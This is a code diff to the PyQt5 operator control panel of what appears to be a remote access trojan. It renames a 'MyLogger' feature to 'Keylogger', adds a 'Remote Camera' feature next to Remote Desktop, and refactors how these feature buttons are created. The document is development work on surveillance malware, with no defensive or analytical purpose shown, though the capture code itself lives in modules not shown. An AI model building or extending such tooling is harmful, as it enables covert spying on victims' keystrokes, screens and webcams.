@@ -1,14 +1,18 @@
 import hashlib
 import socket
 import struct
+from typing import Type
 
 from PyQt5.QtCore import QThread, pyqtSignal
 from PyQt5.QtWidgets import QLabel, QWidget, QPushButton, QDialog, QVBoxLayout, QLineEdit, QHBoxLayout
 
 from RATConnection import RATClient
+from RATFunction.RATFunction import RATFunction
 from RATFunction.EchoUI import EchoUI
 from RATFunction.RATFunction import Side
 from RATFunction.RATFunctionRegistry import RATFunctionRegistry
+from RATFunction.RATFunctionUI import RATFunctionUI
+from RATFunction.RemoteCameraUI import RemoteCameraUI
 from RATFunction.RemoteDesktopUI import RemoteDesktopUI
 from RATFunction.MyLoggingUI import MyLoggingUI
 
@@ -43,13 +47,15 @@ class AdministratorControlPanel(QWidget):
         self.setup_ui()
         self.client = RATClient()
         self.registry = RATFunctionRegistry()
+        self.control_panel_elements = {}
 
         for function_class in function_classes:
             self.registry.add_function(function_class(Side.ADMIN_SIDE, self.client.packet_queue))
 
-        self.setup_echo()
-        self.setup_remote_desktop()
-        self.setup_mylogger()
+        self.add_control_panel_function('Echo', 1, EchoUI)
+        self.add_control_panel_function('Remote Desktop', 2, RemoteDesktopUI)
+        self.add_control_panel_function('Keylogger', 3, MyLoggingUI)
+        self.add_control_panel_function('Remote Camera', 4, RemoteCameraUI)
 
         self.reconnect()
 
@@ -71,7 +77,7 @@ class AdministratorControlPanel(QWidget):
 
     def reconnect(self):
         dialog = QDialog(self)
-        dialog.setWindowTitle('Input Dialog')
+        dialog.setWindowTitle('Connect')
 
         # Create a label and text input field in the dialog
         label = QLabel('Enter password:', dialog)
@@ -106,24 +112,14 @@ class AdministratorControlPanel(QWidget):
         hash_object.update(self.password.encode())
         self.client.send_packet(struct.pack("I 2044s", 0, hash_object.digest()))
 
-    def setup_echo(self):
-        self.echo_button = QPushButton('Echo', self)
-        self.echo_ui = EchoUI(self.registry.get_function(1))
-        self.echo_button.clicked.connect(self.echo_ui.show)
-        self.add_button(self.echo_button)
-
-    def setup_remote_desktop(self):
-        self.remote_desktop_button = QPushButton('Remote Desktop', self)
-        self.remote_desktop_ui = RemoteDesktopUI(self.registry.get_function(2))
-        self.remote_desktop_button.clicked.connect(self.remote_desktop_ui.show)
-        self.add_button(self.remote_desktop_button)
-
     def gui_handle_packet(self, data):
         self.registry.route_packet(data)
 
-    def setup_mylogger(self):
-        self.mylogger_button = QPushButton('MyLogger', self)
-        self.mylogger_ui = MyLoggingUI(self.registry.get_function(3))
-        self.mylogger_button.clicked.connect(self.mylogger_ui.show)
-        self.add_button(self.mylogger_button)
+    def add_control_panel_function(self, function_name: str, function_id: int, function_ui_class: Type[RATFunctionUI]):
+        new_button = QPushButton(function_name, self)
+        new_ui = function_ui_class(self.registry.get_function(function_id))
+        new_button.clicked.connect(new_ui.show)
+        self.add_button(new_button)
+        self.control_panel_elements[function_id] = (new_button, new_ui)
+
 
